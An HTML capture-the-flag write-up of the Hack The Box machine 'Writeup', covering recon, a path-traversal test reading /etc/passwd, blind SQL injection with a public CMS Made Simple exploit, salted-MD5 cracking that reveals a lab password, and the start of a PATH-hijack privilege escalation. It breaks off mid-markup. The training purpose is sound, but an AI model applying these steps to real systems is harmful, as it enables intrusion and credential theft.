<html><head><meta content="text/html; charset=UTF-8" http-equiv="content-type"><style type="text/css">ol{margin:0;padding:0}table td,table th{padding:0}.c1{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c11{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-family:"Arial";font-style:normal}.c6{color:#000000;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c3{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c5{color:#980000;text-decoration:none;vertical-align:baseline;font-size:18pt;font-family:"Arial";font-style:normal}.c13{padding-top:0pt;padding-bottom:0pt;line-height:1.15;orphans:2;widows:2;text-align:left}.c9{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c12{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c7{color:inherit;text-decoration:inherit}.c0{color:#3c78d8;font-weight:700}.c4{height:11pt}.c8{color:#980000}.c2{font-weight:700}.c10{font-size:14pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}</style></head><body class="c12"><div><p class="c4 c13"><span class="c1"></span></p></div><p class="c3"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 113.50px; height: 113.50px;"><img alt="" src="images/image2.png" style="width: 113.50px; height: 113.50px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 118.67px;"><img alt="" src="images/image9.png" style="width: 624.00px; height: 118.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3"><span class="c1">What better opportunity to write a writeup than to write a writeup of a box named Writeup? This box made evident the importance of enumeration. The interesting thing about this box is that gobuster would not work due to a DoS protection against 404 http errors. So how would we find the potentially vulnerable web pages of the web server? </span></p><p class="c3 c4"><span class="c1"></span></p><p class="c3"><span class="c5 c2">Reconnaissance</span></p><p class="c3"><span>The first thing that I always do when targeting a box is adding its ip to my </span><span class="c2">/etc/hosts</span><span class="c1">&nbsp;file, because it is easier to remember a hostname than an ip.</span></p><p class="c3"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 601.00px; height: 62.00px;"><img alt="" src="images/image38.png" style="width: 601.00px; height: 62.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3"><span>Let&rsquo;s start with enumerating the ports of the box </span><span class="c2">nmap -sC -sV -oA nmap/nmap writeup.htb</span><span class="c1">:</span></p><p class="c3"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 213.33px;"><img alt="" src="images/image24.png" style="width: 624.00px; height: 213.33px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3"><span>Looks like there are only two ports running on this box. Because this was a small amount, I ran an nmap scan to enumerate all ports with the </span><span class="c2">-p-</span><span>&nbsp;flag, but I did not discover any other ports. Looking at the result of the nmap scan, the box is running the Debian Linux distribution (noting information like this is important when trying to understand the makeup of a box). Software can differ depending on the operating system / distribution of a system. Nmap discovered a directory </span><span class="c2">/writeup/ </span><span>from the </span><span class="c2">robots.txt</span><span>&nbsp;file. Let&rsquo;s look at the webpage on </span><span class="c2">http://writeup.htb</span><span>:</span></p><p class="c3 c4"><span class="c1"></span></p><p class="c3"><span class="c5 c2">Web Enumeration</span></p><p class="c3"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 426.89px; height: 634.61px;"><img alt="" src="images/image8.png" style="width: 426.89px; height: 634.61px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3"><span>First time I saw this webpage, I foolishly did a gobuster because I did not read the message in red. As a result, I got banned and had to wait a couple of minutes for my ip to no longer be blacklisted. Looking at the message, we can see that there is a DoS script in place to look for 40x errors (this unfortunately includes 404 errors which we need for gobuster to work). Another potentially important thing to note is the email </span><span class="c2">jkr@writeup.htb</span><span>. This means that there might be a user </span><span class="c2">jkr</span><span>&nbsp;on the box (which may or may not come handy). It&rsquo;s a good habit to note down any potentially important information in a </span><span class="c2">notes.txt</span><span class="c1">&nbsp;file. </span></p><p class="c3"><span>Incidentally, because I added the ip to my </span><span class="c2">/etc/hosts</span><span>&nbsp;file and navigated to the </span><span class="c2">http://writeup.htb</span><span>&nbsp;page, it is important to check also </span><span class="c2">http://10.10.10.138</span><span>&nbsp;to make sure there is no virtual host routing in place (for this box it turns out that there is no vhost routing). Let&rsquo;s see what is on the </span><span class="c2">/writeup </span><span class="c1">directory:</span></p><p class="c3"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 224.00px;"><img alt="" src="images/image6.png" style="width: 624.00px; height: 224.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3"><span>Visiting the </span><span class="c2">writeup</span><span class="c1">&nbsp;writeup, we get the following:</span></p><p class="c3"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 262.67px;"><img alt="" src="images/image5.png" style="width: 624.00px; height: 262.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3"><span>There is nothing interesting in this page, or in any of the other pages. However, there is one thing we need to test for. It is possible that the page parameter in the link (</span><span class="c2">http://writeup.htb/writeup/index.phyp?page=writeup</span><span>) is vulnerable to LFI (local file inclusion). Trying </span><span class="c2">http://writeup.htb/writeup/index.phyp?page=../../../../../../../../../../../../etc/passwd</span><span class="c1">, we get the following output:</span></p><p class="c3"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 169.33px;"><img alt="" src="images/image31.png" style="width: 624.00px; height: 169.33px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3"><span>I tried a couple of other methods for LFI to see if there might be some blacklisted characters, but it seems that the </span><span class="c2">page </span><span>parameter is not vulnerable.</span></p><p class="c3 c4"><span class="c2 c5"></span></p><p class="c3"><span class="c5 c2">Blind SQL Injection</span></p><p class="c3"><span>At this point I was stuck for a while, but there is a hint at the bottom of the </span><span class="c2">/writeup</span><span>&nbsp;directory: </span><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 548.00px; height: 50.00px;"><img alt="" src="images/image15.png" style="width: 548.00px; height: 50.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3"><span class="c1">This was hinting at the fact that this page was created with a web content management system (CMS). We can confirm that by viewing the source:</span></p><p class="c3"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 118.67px;"><img alt="" src="images/image33.png" style="width: 624.00px; height: 118.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3"><span>Note the </span><span class="c2">CMS Made Simple</span><span>&nbsp;line. There might be a CMS exploit we could use, but what is the version? Don&rsquo;t forget that Google is your friend! Due to CMS Made Simple being open source, we can easily view the content of this CMS and all of its directories. Visiting </span><span class="c9"><a class="c7" href="https://www.google.com/url?q=http://www.cmsmadesimple.org/downloads/cmsms&amp;sa=D&amp;source=editors&amp;ust=1653884891178100&amp;usg=AOvVaw2INPmOXeqpPu92L_Ba0Fwc">http://www.cmsmadesimple.org/downloads/cmsms</a></span><span>,</span><span>&nbsp;we see a link to their repository: </span><span class="c9"><a class="c7" href="https://www.google.com/url?q=http://svn.cmsmadesimple.org/svn/cmsmadesimple/trunk&amp;sa=D&amp;source=editors&amp;ust=1653884891178603&amp;usg=AOvVaw3aAiGlvZD4VLqL9g6x8Lyz">http://svn.cmsmadesimple.org/svn/cmsmadesimple/trunk</a></span><span class="c1">. Browsing to this link, we see all the directories associated with this CMS: </span></p><p class="c3"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 163.50px; height: 333.99px;"><img alt="" src="images/image25.png" style="width: 163.50px; height: 333.99px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3"><span class="c1">As it turns out, most of these files and directories are on the web server. Checking out the admin directory, we can see that it asks for a password:</span></p><p class="c3"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 158.67px;"><img alt="" src="images/image27.png" style="width: 624.00px; height: 158.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3"><span>Unfortunately, we do not have any credentials....yet. Let&rsquo;s check out the </span><span class="c2">/doc</span><span class="c1">&nbsp;directory, as this directory seems like it would have some file that could leak the version of the CMS. </span></p><p class="c3"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 201.45px; height: 250.50px;"><img alt="" src="images/image19.png" style="width: 201.45px; height: 250.50px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3"><span>The </span><span class="c2">CHANGELOG.txt </span><span>file seems like it would have the version of the CMS. Let&rsquo;s visit the </span><span class="c2">/writeup/doc/CHANGELOG.txt</span><span class="c1">&nbsp;path on the web server:</span></p><p class="c3"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 136.00px;"><img alt="" src="images/image12.png" style="width: 624.00px; height: 136.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3"><span class="c1">&nbsp;So we see that this web page is running CMS Made Simple version 2.2.9.1. Looking up CMS Made Simple on searchsploit, we are flooded with exploits:</span></p><p class="c3"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 476.00px;"><img alt="" src="images/image21.png" style="width: 624.00px; height: 476.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3"><span class="c1">There is only one exploit here that looks promising: the SQL Injection exploit for versions &lt; 2.2.10. All other exploits either require credentials or are too old. Let&rsquo;s mirror this exploit and examine it. The key parts of this exploit is the vulnerable page and payload: </span></p><p class="c3"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 24.00px;"><img alt="" src="images/image7.png" style="width: 624.00px; height: 24.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 407.00px; height: 22.00px;"><img alt="" src="images/image28.png" style="width: 407.00px; height: 22.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 30.67px;"><img alt="" src="images/image30.png" style="width: 624.00px; height: 30.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3"><span>There is a parameter in the News module called </span><span class="c2">m1_idlist</span><span class="c1">&nbsp;that is vulnerable to SQL injection. As we can see from the payload, this script uses a blind SQL injection attack to extract credentials from the affected system. The attack works by asking the server to sleep for a certain period of time if a certain statement is true. So if we find that a request of ours makes the web server take an unusual amount of time to respond to us, then we know that the statement ran true. This means that we could ask the server the following:</span></p><p class="c3 c4"><span class="c6 c2"></span></p><p class="c3"><span class="c2 c8">Pentester:</span><span>&nbsp;&ldquo;Hey web server! You should sleep for 1 second if you have a username in the </span><span class="c2">cms_users</span><span>&nbsp;table that starts with the letter </span><span class="c2">a</span><span class="c1">.&rdquo;</span></p><p class="c3"><span class="c0">Web server:</span><span>&nbsp;&ldquo;Hi Pentester! I don&rsquo;t have a user in my </span><span class="c2">cms_users </span><span>table that starts with the letter </span><span class="c2">a</span><span class="c1">, so I am not going to sleep for 1 second.&rdquo;</span></p><p class="c3"><span class="c8 c2">Pentester: </span><span>&ldquo;No problem! You should sleep for 1 second if you have a username in the </span><span class="c2">cms_users </span><span>table that starts with the letter </span><span class="c2">b</span><span class="c1">.&rdquo;</span></p><p class="c3"><span class="c0">Web server:</span><span>&nbsp;&ldquo;I actually have a user in my </span><span class="c2">cms_users </span><span>table that starts with the letter </span><span class="c2">b</span><span class="c1">, so I will sleep for 1 second.&rdquo;</span></p><p class="c3"><span class="c8 c2">Pentester: </span><span class="c2">&ldquo;</span><span>Okay, so it normally takes the web server to respond to me after 1 second, but now it took the web server two seconds to respond. There is probably a user in the </span><span class="c2">cms_users</span><span>&nbsp;table that starts with the letter </span><span class="c2">b</span><span>. Let&rsquo;s ask the web server another question: &lsquo;Hey web server, it&rsquo;s me again. You should sleep for 1 second if you have a username in the </span><span class="c2">cms_users</span><span>&nbsp;table that starts with the letters </span><span class="c2">ba</span><span class="c1">.&rsquo;&rdquo;</span></p><p class="c3 c4"><span class="c1"></span></p><p class="c3"><span>I think you get the point. Running the exploit with </span><span class="c2">python 46635.py -u </span><span class="c2">http://writeup.htb/writeup</span><span>&nbsp;we get the hashed credentials of the user </span><span class="c2">jkr</span><span class="c1">:</span></p><p class="c3"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 526.00px; height: 91.00px;"><img alt="" src="images/image42.png" style="width: 526.00px; height: 91.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3"><span class="c1">Now all we have to do is crack the hash! Because we have the salt of the hash, we can crack the hash a lot more easily. The hashed password is 32 characters long which suggests that it is an md5 hash. We can use hashcat to crack the password, but this handy exploit even has a cracking function (albeit it is not as fast as hashcat).</span></p><p class="c3"><span class="c2 c6">Script Method:</span></p><p class="c3"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 112.00px;"><img alt="" src="images/image17.png" style="width: 624.00px; height: 112.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 527.00px; height: 115.00px;"><img alt="" src="images/image26.png" style="width: 527.00px; height: 115.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3"><span class="c6 c2">Hashcat Method:</span></p><p class="c3"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 572.00px; height: 24.00px;"><img alt="" src="images/image18.png" style="width: 572.00px; height: 24.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3"><span>Looking at the line above, we can see that the password is hashed by adding the salt and password (note that the </span><span class="c2">line </span><span class="c1">variable refers to a line in the password wordlist). We can conclude that the password is a salted md5sum. Viewing hashcat&rsquo;s example hashes, we can see the mode that corresponds most to what we are looking for.</span></p><p class="c3"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 229.33px;"><img alt="" src="images/image1.png" style="width: 624.00px; height: 229.33px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3"><span>As you can see, mode 20 looks like the right hash so let&rsquo;s crack it. Make sure to first put the hash in the format </span><span class="c2">hash:salt </span><span>as described by the </span><span class="c9"><a class="c7" href="https://www.google.com/url?q=https://hashcat.net/wiki/doku.php?id%3Dexample_hashes&amp;sa=D&amp;source=editors&amp;ust=1653884891182023&amp;usg=AOvVaw2YZka0j0imOgS71lDieBP4">Hashcat - Example Hashes</a></span><span class="c1">&nbsp;page.</span></p><p class="c3"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 66.67px;"><img alt="" src="images/image40.png" style="width: 624.00px; height: 66.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3"><span class="c6 c2">hashcat -m 20 hash /usr/share/wordlists/rockyou.txt </span></p><p class="c3"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 322.67px;"><img alt="" src="images/image14.png" style="width: 624.00px; height: 322.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3"><span>And we get the password for the </span><span class="c2">jkr </span><span>user as </span><span class="c2">raykayjay9</span><span>! These credentials did not work for the </span><span class="c2">/admin</span><span class="c1">&nbsp;directory, but nevertheless we can ssh into the box!</span></p><p class="c3"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 261.33px;"><img alt="" src="images/image34.png" style="width: 624.00px; height: 261.33px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3"><span>Incidentally, the purpose of salts is so that multiple hashes in a compromised credential database do not get cracked simultaneously. It is highly likely that in a database of over a million users, many users have the same password. This would mean that two users with the password of </span><span class="c2">0xd4y</span><span>&nbsp;would both get cracked easily by use of a </span><span class="c9"><a class="c7" href="https://www.google.com/url?q=https://en.wikipedia.org/wiki/Rainbow_table&amp;sa=D&amp;source=editors&amp;ust=1653884891182806&amp;usg=AOvVaw0l_PSwYHT1mHo73hJIVbjd">rainbow table</a></span><span class="c1">. </span></p><p class="c3"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 603.00px; height: 265.00px;"><img alt="" src="images/image29.png" style="width: 603.00px; height: 265.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3"><span>Notice how two users can have the same password of </span><span class="c2">raykayjay9</span><span class="c1">, but their md5sum hashes are different because they have different salt values.</span></p><p class="c3 c4"><span class="c1"></span></p><p class="c3"><span class="c5 c2">Privilege Escalation to Root</span></p><p class="c3"><span>So now that we have a shell, let&rsquo;s enumerate the box to find any possible attack vectors. I like using the </span><span class="c2">linpeas.sh </span><span class="c1">script, as its output is color-coded and is very easy to read.</span></p><p class="c3"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 121.33px;"><img alt="" src="images/image4.png" style="width: 624.00px; height: 121.33px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 603.00px; height: 21.00px;"><img alt="" src="images/image36.png" style="width: 603.00px; height: 21.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 144.00px; height: 26.00px;"><img alt="" src="images/image32.png" style="width: 144.00px; height: 26.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 166.00px; height: 26.00px;"><img alt="" src="images/image16.png" style="width: 166.00px; height: 26.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 156.00px; height: 27.00px;"><img alt="" src="images/image35.png" style="width: 156.00px; height: 27.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3"><span>We can see that we have write access to </span><span class="c2">/usr/local/bin </span><span>and </span><span class="c2">/usr/local/sbin</span><span class="c1">. Furthermore, we are part of the staff group:</span></p><p class="c3"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 34.67px;"><img alt="" src="images/image23.png" style="width: 624.00px; height: 34.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3"><span class="c1">This is a default group for the Debian distro. The permissions given by being part of the staff group should only be granted to trusted users. Here is why:</span></p><p class="c3"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 566.00px; height: 51.00px;"><img alt="" src="images/image20.png" style="width: 566.00px; height: 51.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3"><span>Commands that you run such as </span><span class="c2">grep </span><span>are actually just binaries that are stored in some directory on your machine (typically it is stored in </span><span class="c2">/bin</span><span class="c1">):</span></p><p class="c3"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 285.00px; height: 43.00px;"><img alt="" src="images/image3.png" style="width: 285.00px; height: 43.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3"><span>The point of PATHs is so that you don&rsquo;t have to constantly type </span><span class="c2">/bin/grep</span><span>&nbsp;whenever you want to run that command (it&rsquo;s just tedious). An important thing to note is the order of what&rsquo;s in the </span><span class="c2">$PATH</span><span>&nbsp;variable. By default, </span><span class="c2">/usr/local/bin</span><span>&nbsp;comes before </span><span class="c2">/bin</span><span>. This means that if we made a file and put it in </span><span class="c2">/usr/local/bin</span><span>, then when we run </span><span class="c2">grep</span><span>, we are actually running </span><span class="c2">/usr/local/bin/grep</span><span>&nbsp;and not </span><span class="c2">/bin/grep</span><span class="c1">. </span></p><p class="c3"><span class="c2 c10">Proof of Concept</span></p><p class="c3"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 170.67px;"><img alt="" src="images/image11.png" style="width: 624.00px; height: 170.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 195.00px; height: 29.00px;"><img alt="" src="images/image13.png" style="width: 195.00px; height: 29.00px; 